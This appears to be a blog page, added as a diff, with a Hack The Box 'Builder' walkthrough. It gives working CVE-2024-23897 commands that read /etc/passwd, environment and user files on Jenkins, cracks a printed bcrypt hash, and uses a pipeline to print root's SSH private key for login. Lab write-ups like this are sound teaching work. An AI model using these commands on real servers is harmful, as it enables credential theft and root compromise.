@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en">
+<link rel="icon" href="/images/favicon.ico" type="image/x-icon">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" type="text/css" href="/theme/css/elegant.prod.9e9d5ce754.css" media="screen">
+        <link rel="stylesheet" type="text/css" href="/theme/css/custom.css" media="screen">
+
+        <link rel="dns-prefetch" href="//fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+
+        <meta name="author" content="3v401" />
+
+        <meta property="og:type" content="article" />
+        <meta name="twitter:card" content="summary">
+
+<meta name="keywords" content="Builder, Pentesting, Security, HTB, " />
+
+<meta property="og:title" content="HTB – Builder Walkthrough "/>
+<meta property="og:url" content="/builder.html" />
+<meta property="og:description" content="&#34;Builder&#34; machine." />
+<meta property="og:site_name" content="3v401&#39;s CyberAdventures🏴‍☠️🗺️" />
+<meta property="og:article:author" content="3v401" />
+<meta property="og:article:published_time" content="2025-04-18T00:00:00+02:00" />
+<meta name="twitter:title" content="HTB – Builder Walkthrough ">
+<meta name="twitter:description" content="&#34;Builder&#34; machine.">
+
+        <title>HTB – Builder Walkthrough  · 3v401&#39;s CyberAdventures🏴‍☠️🗺️
+</title>
+
+
+
+    </head>
+    <body>
+        <div id="content">
+            <div class="navbar navbar-static-top">
+                <div class="navbar-inner">
+                    <div class="container-fluid">
+                        <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                        </a>
+                        <a class="brand" href="/"><span class=site-name>3v401's CyberAdventures🏴‍☠️🗺️</span></a>
+                        <div class="nav-collapse collapse">
+                            <ul class="nav pull-right top-menu">
+                                <li >
+                                    <a href=
+                                       "/"
+                                    >Home</a>
+                                </li>
+                                <li ><a href="/categories.html">Categories</a></li>
+                                <li ><a href="/tags.html">Tags</a></li>
+                                <li ><a href="/archives.html">Archives</a></li>
+                                <li><form class="navbar-search" action="/search.html" onsubmit="return validateForm(this.elements['q'].value);"> <input type="text" class="search-query" placeholder="Search" name="q" id="tipue_search_input"></form></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="container-fluid">
+                <div class="row-fluid">
+                    <div class="span1"></div>
+                    <div class="span10">
+<article itemscope>
+<div class="row-fluid">
+    <header class="page-header span10 offset2">
+        <h1>
+            <a href="/builder.html">
+                HTB – Builder Walkthrough
+            </a>
+        </h1>
+    </header>
+</div>
+
+<div class="row-fluid">
+        <div class="span8 offset2 article-content">
+            
+            <h1>Builder</h1>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic34.png?raw=true"></p>
+<h2>Contents</h2>
+<ol>
+<li>Jenkins directory structure</li>
+<li>Containerization (Docker)</li>
+<li>Exploitation of <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23897">CVE-2024-23897</a></li>
+<li>Privilege Escalation</li>
+</ol>
+<h2>Tutorial</h2>
+<h3>Scanning and Reconnaissance</h3>
+<p>Let's start scanning the ports. Type:</p>
+<div class="highlight"><pre><span></span><code>nmap -p- --min-rate=1000 -T4 -sV -sC 10.10.11.10
+</code></pre></div>
+
+<p>The --min-rate=1000 option in nmap is used to specify the minimum number of packets sent per second during the scan. This is particularly useful for speeding up the scan, especially when dealing with a large number of ports (like when scanning all 65,535 TCP ports). The "T" label stands for "timing". Each timing has its own level of aggresivity.</p>
+<div class="highlight"><pre><span></span><code>-T0 (Paranoid): Extremely slow and stealthy, used to avoid detection by IDS/IPS systems.
+-T1 (Sneaky): Similar to -T0 but slightly faster.
+-T2 (Polite): Waits longer between sending packets to avoid causing disruption.
+-T3 (Normal): Default setting, balances speed and performance without being too aggressive.
+-T4 (Aggressive): Faster than default, uses shorter timeouts and more parallelism.
+-T5 (Insane): Extremely fast and aggressive, can overwhelm networks and be detected easily.
+</code></pre></div>
+
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic1.png?raw=true"></p>
+<p>We don' t have access credentials to the SSH service, so let' s try with the opened port 8080. We can observe that the specific HTTP server software is Jetty 10.0.18. The http-title indicates that the web application running on this port is Jenkins (a popular automation server for CI/CD). We also observe a "robots.txt" file which is used by websites to give instructions to web crawlers and spiders about which pages should not be indexed. You can observe in the next row the term "_/" which means that the root directory is disallowed, meaning that the entire site shouldn' t be indexed by search engines. <code>http-open-proxy</code> indcates that the scan detected the server might be an open proxy, which means it could potentially allow unauthorized users to relay their requests through this server.</p>
+<p>Let's enter in 10.10.11.10:8080 and see what appears</p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic2.png?raw=true"></p>
+<p>Before scrolling and visiting sections, we have to detect the software version that the site is built on. We see that it is Jenkins 2.441.</p>
+<h4>Jenkins</h4>
+<p><a href="https://en.wikipedia.org/wiki/Jenkins_(software)">Jenkins</a> is a tool for automating the software development process from code integration and testing to deployment. Its extensibility and integration capabilities make it a popular choice for teams practicing DevOps and agile methodologies.</p>
+<p>When you access the webpage at <code>http://10.10.11.8:8080</code> and observe that the Linux server (pic1) uses Jenkins (pic2), it means that Jenkins is installed and running on that server. The Jenkins web interface is being served on port 8080, allowing you to interact with Jenkins through your web browser. How do we interact with the server through Jenkins? And more important, is there a vulnerability for Jenkins 2.441?</p>
+<p>Let's look for "Jenkins 2.441 vulnerability" on the internet. After a quick search we find the following <a href="https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314">URL</a> on the Jenkins documentation. It makes reference to the vulnerability <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23897">CVE-2024-23897</a>.</p>
+<h5>Vulnerability explained</h5>
+<p><code>Arbitrary file read vulnerability through the CLI can lead to RCE</code>. RCE stands for Remote Code Execution.
+The documentation states that Jenkins has a built-in command line interface (CLI) to access Jenkins from a script or shell environment (we will use shell environment). Jenkins uses the <code>args4j</code> library to parse command arguments and options on the Jenkins controller when processing CLI commands. This command parser (args4j library) has a feature that replaces an <code>@</code> character followed by a file path in an argument with the file’s contents (<code>expandAtFiles</code>). This feature is enabled by default and Jenkins 2.441 and earlier, LTS 2.426.2 and earlier does not disable it.</p>
+<p>So, how do we get a Jenkins CLI? Search on the internet <code>get jenkins cli</code>, access the Jenkins documentation, read the description and access to section <a href="https://www.jenkins.io/doc/book/managing/cli/#downloading-the-client">Downloading the client</a>, which is what we want to interact with the server. The documentation states that the CLI client can be downloaded directly from a Jenkins controller at the URL <code>/jnlpJars/jenkins-cli.jar</code>, in effect <code>JENKINS_URL/jnlpJars/jenkins-cli.jar</code>. So we connect to the host server and introduce such URL:</p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic3.png?raw=true"></p>
+<p>Now that we have the Jenkins-CLI, how do we use Jenkins-CLI? How do we insert the payload into the webserver?</p>
+<h5>How to use Jenkins-CLI</h5>
+<p>The general syntax of using Jenkins-CLI.jar can be found <a href="https://www.jenkins.io/doc/book/managing/cli/#using-the-client">here</a>. A general command should be:</p>
+<div class="highlight"><pre><span></span><code>java -jar jenkins-cli.jar [-s JENKINS_URL] [global options...] command [command options...] [arguments...]
+</code></pre></div>
+
+<p>Now that we know the general command structure. How do we modify it such that we inject a payload?</p>
+<h5>How to insert Payload into Jenkins 2.441</h5>
+<p>Searching <code>CVE-2024-23897 PoC</code> we find the following Splunk <a href="https://www.splunk.com/en_us/blog/security/security-insights-jenkins-cve-2024-23897-rce.html">site</a>. Reading the section <code>Payload Body Explanation</code> we can observe the payload structure as:</p>
+<p><code>[Command Length][Command ('help')][File Path Length][File Path ('@/etc/passwd')][Other Parameters]</code></p>
+<p>From here we can infere that the injection should be something like <code>Jenkins-CLI command -s http://&lt;JENKINS_SERVER&gt;:8080 help "@/etc/passwd"</code>. Therefore, the injection should be:</p>
+<div class="highlight"><pre><span></span><code>java -jar jenkins-cli.jar -s http://&lt;JENKINS_SERVER&gt;:8080 help &quot;@/etc/passwd&quot;
+</code></pre></div>
+
+<p>Why the path <code>/etc/passwd</code>? We could search for other filepaths. Searching the <code>/etc/passwd</code> file on a Unix or Linux system is crucial for both administrative and security purposes because it contains vital information about all user accounts on the system. This file lists usernames, user IDs, group IDs, home directories, and default shells for each user, though it does not contain actual passwords, which are stored in <code>/etc/shadow</code> (we will check it later). For system administrators, <code>/etc/passwd</code> is essential for managing user accounts and auditing the system to identify any unusual or unauthorized entries. From a security perspective, attackers often target this file during reconnaissance to gather information about user accounts, which can be used for privilege escalation, targeted password attacks, and other exploitative activities.</p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic7.png?raw=true"></p>
+<p>In this picture, we attempted to use the Jenkins CLI to read the <code>/etc/passwd</code> file by passing it as an argument to the help command. The help command interpreted the contents of <code>/etc/passwd</code> as multiple arguments, leading to the error message: <code>ERROR: Too many arguments: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</code>. This line is the first line from <code>/etc/passwd</code>, showing the entry for the <code>daemon</code> user. The <code>daemon</code> user on Unix-like systems is a special system account used to run background services (daemons). It typically has limited permissions and is not intended for interactive login. This account helps in organizing and running system processes securely without giving them root privileges. There is also presence of the <code>root</code> user. The structure <code>root:x:0:0:root:/root:/bin/bash</code> from <code>/etc/passwd</code> provides some details about the root user account, for example <code>bin/bash</code> as shell. Let' s see the <code>/etc/shadow</code> to find the password:</p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic8.png?raw=true"></p>
+<p>No contents for <code>java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' help "@/etc/shadow"</code>. Let' s keep exploiting the server with this command line. We can also enumerate the environment of the Jenkins server. Let' s target <code>/proc/self/environ</code>, a special file in the proc filesystem on Unix-like operating systems that contains the environment variables of the process. Type:</p>
+<div class="highlight"><pre><span></span><code>java -jar jenkins-cli.jar -s &#39;http://10.10.11.10:8080&#39; help &quot;@/proc/self/environ&quot;
+</code></pre></div>
+
+<p>You will see the following outcome</p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic9.png?raw=true"></p>
+<p>First we get a list of commands for the Jenkins server. This is interesting because maybe these variables can help us to exploite the machine more.</p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic10.png?raw=true"></p>
+<p>At the end of the prompt (bottom), the <code>help</code> command cannot interpretate <code>HOSTNAME=...</code> like it did with the other variables. So returns an error. Nonetheless, we obtain several paths and addresses of interest.</p>
+<ol>
+<li>HOSTNAME=0f52c222a4cc</li>
+<li>JENKINS_UC_EXPERIMENTAL=https://updates.jenkins.io/experimental</li>
+<li>JAVA_HOME=/opt/java/openjdk</li>
+<li>JENKINS_INCREMENTALS_REPO_MIRROR=https://repo.jenkins-ci.org/incrementals</li>
+<li>COPY_REFERENCE_FILE_LOG=/var/jenkins_home/copy_reference_file.log</li>
+<li>PWD=/JENKINS_SLAVE_AGENT_PORT=50000</li>
+<li>JENKINS_VERSION=2.441</li>
+<li>HOME=/var/jenkins_home</li>
+<li>LANG=C.UTF-8</li>
+<li>JENKINS_UC=https://updates.jenkins.io</li>
+<li>SHLVL=0</li>
+<li>JENKINS_HOME=/var/jenkins_home</li>
+<li>REF=/usr/share/jenkins/ref</li>
+<li>PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</li>
+</ol>
+<p>Observe that we can analyze potential files (user.txt, root.txt) in these environment variables (HOME, PATH, or JENKINS_HOME) because that what we are targetting in this machine. Let' s try to find the user flag <code>user.txt</code> on these paths.</p>
+<div class="highlight"><pre><span></span><code><span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">jar</span><span class="w"> </span><span class="n">jenkins</span><span class="o">-</span><span class="n">cli</span><span class="o">.</span><span class="n">jar</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="s1">&#39;http://10.10.11.10:8080&#39;</span><span class="w"> </span><span class="n">help</span><span class="w"> </span><span class="s2">&quot;@/var/jenkins_home/user.txt&quot;</span>
+</code></pre></div>
+
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic10-1.png?raw=true"></p>
+<p>You found the user flag! Remember you have to introduce the <code>user.txt</code> filename to read it because the vulnerability reads files, not directories. Usually user flags are located in $HOME directory in HTB.</p>
+<h3>Root flag</h3>
+<p>There are no available root paths declared in our list of 14 variables. Finding the root flag by brutte force is not a correct way to approach it (we also don't have admin credentials). Exploring the Jenkins Directory by brute force is not a smart move. A good idea would be to design a minimal one (locally) and explore the directories to see if we can find something interesting on the server later like configuration files, usernames, passwords... The best way is to mimic this Jenkins server is with a container and explore it. We will use Docker.</p>
+<h5>Why a Docker container?</h5>
+<p>The HOSTNAME variable <code>0f52c222a4cc</code> is likely an ID of a containerized environment, specifically a Docker container. It serves as a unique identifier for the container. So type search on the internet "jenkins docker" and select the jenkins GitHub repository (I read the <a href="https://www.jenkins.io/doc/book/installing/docker/">documentation</a> and not useful information on how to use it easily found). Access the Jenkins <a href="https://github.com/jenkinsci/docker">GitHub</a> repository. First, we need to install docker. For that type: <code>sudo apt install docker.io</code> Now let's setup the Docker container for Jenkins. Type:</p>
+<div class="highlight"><pre><span></span><code>docker pull jenkins/jenkins:lts-jdk17
+</code></pre></div>
+
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic11.png?raw=true"></p>
+<div class="highlight"><pre><span></span><code>docker run -p 8080:8080 --restart=on-failure jenkins/jenkins:lts-jdk17
+</code></pre></div>
+
+<p>First command pulls a specific Docker image (jenkins:lts-jdk17) from Docker Hub. Second command runs a Docker container using the Jenkins image that was pulled in the previous step.
+1. <code>docker run</code>: Starts a new container from an image.
+2. <code>-p 8080:8080</code>: Maps the port 8080 from the host to port 8080 on the container. It makes Jenkins container accessible via <code>http://&lt;host-ip&gt;:8080</code>.
+3. <code>--restart=on-failure</code>: Ensures that the container will automatically restart if it crashes or exits with a non-zero status.
+4. <code>jenkins/jenkins:lts-jdk17</code>: The docker image that is going to be used for the container.</p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic12.png?raw=true"></p>
+<p>We have a password generated (you will have another different). Let's enter into this docker container. The container has been set up locally, so we should enter with <code>127.0.0.1</code> through port <code>8080</code> which is the one setled in the previous command. Open your browser and access <code>127.0.0.1:8080</code></p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic13.png?raw=true"></p>
+<p>Introduce your generated password. Select <code>Select plugins to install</code> and unselect all marks in the list to accelerate the installation (we want the most basic Jenkins Docker container to explore the directories). Introduce Username, password and fullname in your configuration. Accept your default Jenkins URL. Now open a new terminal and run the following commands:</p>
+<ol>
+<li><code>sudo docker ps -a</code>: To list all containers (running or not).</li>
+<li><code>sudo start 4e</code>: To start the Docker container that beggins with 4e (yours will be different. Check your list of containers with the prevous command.</li>
+<li><code>sudo docker exec -it 4e bash</code>: Opens a terminal inside the running container that starts with 4e ID.</li>
+</ol>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic15.png?raw=true"></p>
+<h5>Directory exploration</h5>
+<p>At this point we must think: We are in a simulated Jenkins Docker container (like our target). We got the user flag. What do we want? Obtaining root privileges. We need the sudo password. Where can we find such sudo password? We know that in my docker container, the sudo password is <code>15a01c1cb3ce4abab9cc6e7976882c5d</code>. So it would be desirable to find a file that contains information <code>user:password</code>. These kind of files are usually named with the keyword "user, root, password...". I only show the first one:</p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic16.png?raw=true"></p>
+<p>These files are usually for:
+1. user.svg, new-user.svg, computer-user-offline.svg: Icon or image files used in the Jenkins web interface.
+2. users.xml: Configuration or data file that stores user information for Jenkins.</p>
+<p><code>.xml</code> files are used for: Data storage, configuration, data exchange or document formatting. In Jenkins, .xml files often store configuration settings, user data, and job definitions. Let' s open users.xml</p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic17.png?raw=true"></p>
+<p>What is this? Well, first we must know a bit about .xml files. The first line specifies the XML version and character encoding. Third line the version of the user ID mapping format. The next part is the ID to Directory Name Map (Maps user IDs to their corresponding directory names), for example, here, the file is used by Jenkins to map user ID "kali" to a unique directory name for storing user-specific data (kali_5195686553352608093). So there must be a directory "kali_XXXX". We access the location of <code>users.xml</code> and observe that effectively, there was a folder with such name. Let's see its contents.</p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic18.png?raw=true"></p>
+<p>The <code>config.xml</code> file for the user "kali" holds detailed configuration information for that specific user. It includes the user’s ID and full name, as well as various properties and settings. These properties manage user preferences. It also contains user-specific security details like the encrypted password and API tokens. The password stored in this file is encrypted using <code>bcrypt</code>, a hashing algorithm designed to securely hash passwords. This ensures that even if someone gains access to the <code>config.xml</code> file, they cannot easily retrieve the plaintext password. Nonetheless, we can easily decrypt it with <a href="https://en.wikipedia.org/wiki/John_the_Ripper">John the Ripper</a>.</p>
+<p>We got the list of users with <code>cat /var/jenkins_home/users/users.xml</code>. Let' s see what happens if er inject this command into our target server.</p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic19.png?raw=true"></p>
+<p>It looks like we don' t see all the content. Nonetheless, jenkins-cli.jar has several commands. We only attempted help. Also, when you run <code>java -jar jenkins-cli.jar</code> you get the following outcome:  <code>The available commands depend on the server. Run the 'help' command to see the list.</code>. So type: <code>java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' help</code>.</p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic20.png?raw=true"></p>
+<p>You will get an enormous list of commands to try (more than 15). Observe that they are the same environment variables that we saw with <code>java -jar jenkins-cli.jar -s 'http://10.10.11.10:8080' help "@/proc/self/environ</code>. Trying all commands by hand is a crazy task, so I made a script to test all of them. The structure of the command is:</p>
+<div class="highlight"><pre><span></span><code><span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">jar</span><span class="w"> </span><span class="n">jenkins</span><span class="o">-</span><span class="n">cli</span><span class="p">.</span><span class="n">jar</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="s1">&#39;http://10.10.11.10:8080&#39;</span><span class="w"> </span><span class="o">[</span><span class="n">COMMAND</span><span class="o">]</span><span class="w"> </span><span class="ss">&quot;@/var/jenkins_home/users/users.xml&quot;</span>
+</code></pre></div>
+
+<p>If you want to get the script you can get it <a href="https://github.com/3v401/HackTheBox/blob/main/Builder/command_tester_jenkins.py">here</a>. The script executed commands that returned only one line of the file, others nothing from the file, and others the complete document. The commands that showed the complete file are: <code>connect-node</code>, <code>delete-job</code>, <code>delete-node</code>, <code>delete-view</code>, <code>disconnect-node</code>, <code>offline-node</code>, <code>online-node</code> and <code>reload-job</code>. Here you have 3 screenshots of the execution of the code</p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic10-2.png?raw=true"></p>
+<p>Previous picture shows how to execute the program, first the template command to try, second the direction of the file you want to analyse. Returns the commands of that program and executes them iteratively.</p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic10-3.png?raw=true"></p>
+<p><code>add-job-to-view</code>, <code>build</code>, <code>cancel-quiet-down</code>... don't return content.</p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic10-4.png?raw=true"></p>
+<p><code>connect-node</code> is the first command that returns content. So type:</p>
+<div class="highlight"><pre><span></span><code><span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">jar</span><span class="w"> </span><span class="n">jenkins</span><span class="o">-</span><span class="n">cli</span><span class="o">.</span><span class="n">jar</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="s1">&#39;http://10.10.11.10:8080&#39;</span><span class="w"> </span><span class="n">connect</span><span class="o">-</span><span class="n">node</span><span class="w"> </span><span class="s2">&quot;@/var/jenkins_home/users/users.xml&quot;</span>
+</code></pre></div>
+
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic21.png?raw=true"></p>
+<p>We got the username of our target containerized server! So, there must be a user called <code>jennifer_12108429903186576833</code>. Let's search for it the same way we searched for <code>kali_XXXX</code>.</p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic22.png?raw=true"></p>
+<p>As expected, we found the same file in the same location. The developer didn' t change the path. Everything remained as default.</p>
+<ol>
+<li>email address: <code>jennifer@builder.htb</code></li>
+<li>seed: <code>6841d11dc1de101d</code></li>
+<li>The hashed password: #jbcrypt <code>$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</code></li>
+</ol>
+<p>We can decipher the password quickly with John the Ripper:</p>
+<p>(insert command johntheripper and screenshot)
+(pic23, pending to do the screenshot)</p>
+<p>The password is <code>princess</code> (this is the equivalent of the password you settled when creating a jenkins docker container in the browser with your username and password).</p>
+<h4>Privilege Escalation</h4>
+<p>Hold on! So we have the user <code>jennifer</code> and the password <code>princess</code>. We could try to log in the jenkins server (browser) with user and password. <code>jenkins-cli.jar</code> cannot make effective sudo-su commands, only reading files. Let's try loggin in the platform.</p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic24.png?raw=true"></p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic25.png?raw=true"></p>
+<p>We are in! Searching around the platform, you can access "jennifer", "Credentials". You will see access to the <code>root</code> system through ssh.</p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic26.png?raw=true"></p>
+<p>We saw with nmap that the Jenkins server has an open ssh connection (therefore we can communicate with the server through ssh), it has a root ssh PRIVATE KEY on the platform. Is there a way to retrieve this PRIVATE KEY? Yes, we could run a job on Jenkins platform with jennifer's account (i.e., running a pipeline) to print the PRIVATE KEY of the root user for ssh connection. The question is, does Jennifer have admin privileges to access <code>/root/.ssh</code>? We will check this. First we must verify if installed plugins for ssh capability are added (you see that they are).</p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic27.png?raw=true"></p>
+<p>Create a pipeline from Dashboard. Now we must ask ourselves how must be the pipeline to retrieve the ssh PRIVATE KEY. A good way to start is looking on the internet for "jenskins example pipeline ssh" and access the <a href="https://stackoverflow.com/questions/44237417/how-do-i-use-ssh-in-a-jenkins-pipeline">stack overflow post</a>.</p>
+<p>We must modify this pipeline at our needs. We must know that the URL shows an older declarative Jenkins pipeline syntax. We mus update the pipeline in a more modern way:</p>
+<ol>
+<li>We use now declarative syntax to make it easier to read and understand the pipeline structure</li>
+<li>Structured <code>stages</code> and <code>steps</code> defined clearly within the pipeline to break the pipeline in distinct parts</li>
+<li>Define <code>agent any</code> to run the pipeline on any available agent. It ensures the pipeline ca nrun on any node that has the necessary configuration.</li>
+<li><code>script</code> block inserts the script we want to inject</li>
+<li><code>sshagent</code> block specifies the credentials for the ssh connection. <code>credentials</code> parameter takes an array of credentials.</li>
+<li><code>ssh command</code> connects to the remote host and prints <code>id_rsa</code> file. The <code>-o StrictHostKeyChecking=no</code> option is used to bypass host key checking.</li>
+</ol>
+<div class="highlight"><pre><span></span><code><span class="n">pipeline</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">agent</span><span class="w"> </span><span class="n">any</span>
+<span class="w">    </span><span class="n">stages</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">stage</span><span class="p">(</span><span class="err">&#39;</span><span class="n">SSH</span><span class="err">&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">steps</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="n">script</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="n">sshagent</span><span class="p">(</span><span class="n">credentials</span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="sc">&#39;1&#39;</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                        </span><span class="n">sh</span><span class="w"> </span><span class="err">&#39;</span><span class="n">ssh</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">StrictHostKeyChecking</span><span class="o">=</span><span class="n">no</span><span class="w"> </span><span class="n">root</span><span class="mf">@10.10.11.10</span><span class="w"> </span><span class="s">&quot;cat /root/.ssh/id_rsa&quot;</span><span class="err">&#39;</span>
+<span class="w">                    </span><span class="p">}</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>We can't know the exact location of the PRIVATE KEY. Doing several attempts of this pipeline is the best methodology to find it. I share the final location of the PRIVATE KEY in the pipeline above. I first searched for the <code>/root/</code> folder</p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic28-1.png?raw=true"></p>
+<p>and later for the <code>.ssh</code> folder with its content. We found that the PRIVATE KEY was lovated in <code>id_rsa</code>.</p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic28-2.png?raw=true"></p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic28.png?raw=true"></p>
+<p>Save and click on "Build Now". </p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic29.png?raw=true"></p>
+<p>Open the logs, you will see the PRIVATE KEY</p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic30.png?raw=true"></p>
+<p>Save the PRIVATE KEY in a .txt file and launch the following command: <code>chmod 600 root_private_key.txt</code></p>
+<p><code>ssh -i root_private_key.txt root@10.10.11.10</code></p>
+<p><img alt="image" src="https://github.com/3v401/HackTheBox/blob/main/Builder/pics/pic33.png?raw=true"></p>
+<p>Congratulations! 🥳 Now you have the root flag!</p>
+
+
+             
+ 
+            
+            
+            
+
+
+
+
+
+
+
+            <hr/>
+        </div>
+        <section id="article-sidebar" class="span2">
+            <h4>Published</h4>
+            <time itemprop="dateCreated" datetime="2025-04-18T00:00:00+02:00">Fri 18 April 2025</time>
+            <h4>Category</h4>
+            <a class="category-link" href="/categories.html#htb-ref">HTB</a>
+            <h4>Tags</h4>
+            <ul class="list-of-tags tags-in-article">
+                <li><a href="/tags.html#builder-ref">Builder
+                    <span class="superscript">1</span>
+</a></li>
+                <li><a href="/tags.html#pentesting-ref">Pentesting
+                    <span class="superscript">1</span>
+</a></li>
+                <li><a href="/tags.html#security-ref">Security
+                    <span class="superscript">1</span>
+</a></li>
+            </ul>
+<h4>Contact</h4>
+<div id="sidebar-social-link">
+</div>
+            
+
+
+
+
+
+            
+
+
+
+
+
+        </section>
+</div>
+</article>
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe.
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides.
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo https://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>                    </div>
+                    <div class="span1"></div>
+                </div>
+            </div>
+        </div>
+<footer>
+
+
+
+
+    <div id="fpowered">
+        Powered by: <a href="http://getpelican.com/" title="Pelican Home Page" target="_blank" rel="nofollow noopener noreferrer">Pelican</a>
+        Theme: <a href="https://elegant.oncrashreboot.com/" title="Theme Elegant Home Page" target="_blank" rel="nofollow noopener noreferrer">Elegant</a>
+    </div>
+</footer>            <script src="//code.jquery.com/jquery.min.js"></script>
+        <script src="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.2/js/bootstrap.min.js"></script>
